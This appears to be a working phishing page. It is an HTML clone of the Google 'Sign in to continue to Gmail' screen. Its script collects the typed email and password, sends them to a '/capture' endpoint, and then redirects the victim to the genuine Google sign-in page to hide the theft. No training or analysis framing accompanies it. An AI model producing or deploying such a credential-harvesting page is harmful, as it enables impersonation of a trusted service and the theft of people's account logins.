<!DOCTYPE html>
<html>
<head>
    <title>Google Account - Sign in</title>
    <style>
        body { font-family: 'Google Sans', Roboto, Arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { max-width: 448px; width: 100%; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; }
        .logo { text-align: center; margin-bottom: 20px; }
        .logo img { width: 75px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 0; }
        h2 { font-size: 16px; font-weight: 400; color: #202124; margin-top: 8px; }
        input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; margin: 8px 0; }
        button { background: #1a73e8; color: white; border: none; padding: 9px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; float: right; }
        .footer { margin-top: 40px; clear: both; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg width="75" height="24" viewBox="0 0 75 24">
                <path d="M9.24 6.96V9.6H4.32v2.64h4.56v2.64H4.32v2.88H9.6v2.64H1.2V4.32h8.04v2.64z" fill="#4285F4"/>
                <path d="M17.28 13.44c0 2.64-2.16 4.8-4.8 4.8s-4.8-2.16-4.8-4.8 2.16-4.8 4.8-4.8 4.8 2.16 4.8 4.8zm-2.64 0c0-1.2-.96-2.16-2.16-2.16s-2.16.96-2.16 2.16.96 2.16 2.16 2.16 2.16-.96 2.16-2.16z" fill="#EA4335"/>
                <!-- Additional Google logo paths -->
            </svg>
        </div>
        
        <h1>Sign in</h1>
        <h2>to continue to Gmail</h2>
        
        <form id="loginForm" onsubmit="return false;">
            <input type="email" id="email" placeholder="Email or phone" required>
            <input type="password" id="password" placeholder="Enter your password" required>
            <button type="button" onclick="submitCredentials()">Next</button>
        </form>
        
        <div class="footer">
            <a href="#">Create account</a>
            <a href="#" style="float: right;">Forgot email?</a>
        </div>
    </div>
    
    <script>
        function submitCredentials() {
            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;
            
            fetch('/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email: email, password: password })
            }).then(() => {
                window.location.href = 'https://accounts.google.com';
            });
        }
    </script>
</body>
</html>
